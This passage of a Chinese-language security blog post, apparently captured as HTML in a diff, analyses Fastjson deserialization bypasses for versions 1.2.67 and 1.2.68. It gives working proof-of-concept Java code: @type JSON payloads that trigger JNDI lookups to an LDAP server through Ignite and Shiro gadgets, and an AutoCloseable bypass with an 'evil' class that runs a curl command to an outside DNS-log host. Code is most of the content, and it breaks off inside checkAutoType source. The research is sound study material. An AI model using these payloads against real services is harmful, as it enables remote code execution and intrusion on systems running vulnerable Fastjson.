+</span></span><span class="line"><span class="cl">            <span class="n">userTransaction</span> <span class="o">=</span> <span class="o">(</span><span class="n">UserTransaction</span><span class="o">)</span> <span class="n">initCtx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">utxName</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">SqlMapException</span><span class="o">(</span><span class="s">&#34;Error initializing JtaTransactionConfig while looking up UserTransaction (&#34;</span> <span class="o">+</span> <span class="n">utxName</span> <span class="o">+</span> <span class="s">&#34;).  Cause: &#34;</span> <span class="o">+</span> <span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png, https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png 1.5x, https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png"
+        title="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png" /></p>
+<h2 id="1267">1.2.67</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">与1.2.45的绕过类似,通过多个类进行绕过
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_67</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&#34;, \&#34;jndiNames\&#34;:[\&#34;ldap://127.0.0.1:1389/exp\&#34;], \&#34;tm\&#34;: {\&#34;$ref\&#34;:\&#34;$.tm\&#34;}}&#34;</span><span class="o">;</span><span class="c1">// $.tm为路径引用,即调用getTm方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;org.apache.shiro.jndi.JndiObjectFactory\&#34;,\&#34;resourceName\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;,\&#34;instance\&#34;:{\&#34;$ref\&#34;:\&#34;$.instance\&#34;}}&#34;;// $.instance为路径引用,即调用getInstance方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png, https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png 1.5x, https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png"
+        title="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png" /></p>
+<h3 id="cachejnditmlookup分析">CacheJndiTmLookup分析</h3>
+<blockquote>
+<p>ignite-core 2.10.0 , ignite-jta 2.10.0</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setJndiNames</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">jndiNames</span> <span class="o">=</span> <span class="n">jndiNames</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** {@inheritDoc} */</span>
+</span></span><span class="line"><span class="cl">    <span class="nd">@Nullable</span> <span class="nd">@Override</span> <span class="kd">public</span> <span class="n">TransactionManager</span> <span class="nf">getTm</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IgniteException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">jndiNames</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="o">!</span><span class="n">jndiNames</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">InitialContext</span> <span class="n">ctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">s</span> <span class="o">:</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">s</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">obj</span> <span class="k">instanceof</span> <span class="n">TransactionManager</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="o">(</span><span class="n">TransactionManager</span><span class="o">)</span> <span class="n">obj</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png, https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png 1.5x, https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png"
+        title="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png" /></p>
+<h3 id="jndiobjectfactory分析">JndiObjectFactory分析</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.shiro.jndi.JndiObjectFactory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">T</span> <span class="nf">getInstance</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="o">(</span><span class="n">requiredType</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">requiredType</span><span class="o">.</span><span class="na">cast</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">resourceName</span><span class="o">,</span> <span class="n">requiredType</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">(</span><span class="n">T</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">resourceName</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">typeName</span> <span class="o">=</span> <span class="n">requiredType</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">requiredType</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;object&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalStateException</span><span class="o">(</span><span class="s">&#34;Unable to look up &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; with jndi name &#39;&#34;</span> <span class="o">+</span> <span class="n">resourceName</span> <span class="o">+</span> <span class="s">&#34;&#39;.&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setResourceName</span><span class="o">(</span><span class="n">String</span> <span class="n">resourceName</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">resourceName</span> <span class="o">=</span> <span class="n">resourceName</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png, https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png 1.5x, https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png"
+        title="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png" /></p>
+<h2 id="1268">1.2.68</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_68</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//无需开启AutoTypeSupport
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.lang.AutoCloseable\&#34;,\&#34;@type\&#34;:\&#34;learn.bypass.evil_1_2_68\&#34;}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">evil_1_2_68</span> <span class="kd">implements</span> <span class="n">AutoCloseable</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">evil_1_2_68</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;curl http://1.2.68.6bb37b09.dns.1433.eu.org&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">close</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png, https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png 1.5x, https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png"
+        title="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png" /></p>
+<h3 id="checkautotype分析-5">checkAutoType分析</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">typeName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeCheckHandlers</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="n">AutoTypeCheckHandler</span> <span class="n">h</span> <span class="o">:</span> <span class="n">autoTypeCheckHandlers</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">type</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="na">handler</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">expectClass</span><span class="o">,</span> <span class="n">features</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">type</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">type</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">safeModeMask</span> <span class="o">=</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SafeMode</span><span class="o">.</span><span class="na">mask</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">safeMode</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">safeMode</span> <span class="o">||</span> <span class="o">(</span><span class="n">features</span> <span class="o">&amp;</span> <span class="n">safeModeMask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">(</span><span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_PARSER_FEATURE</span> <span class="o">&amp;</span> <span class="n">safeModeMask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">safeMode</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;safeMode not support autoType : &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">typeName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">192</span> <span class="o">||</span> <span class="n">typeName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">expectClassFlag</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
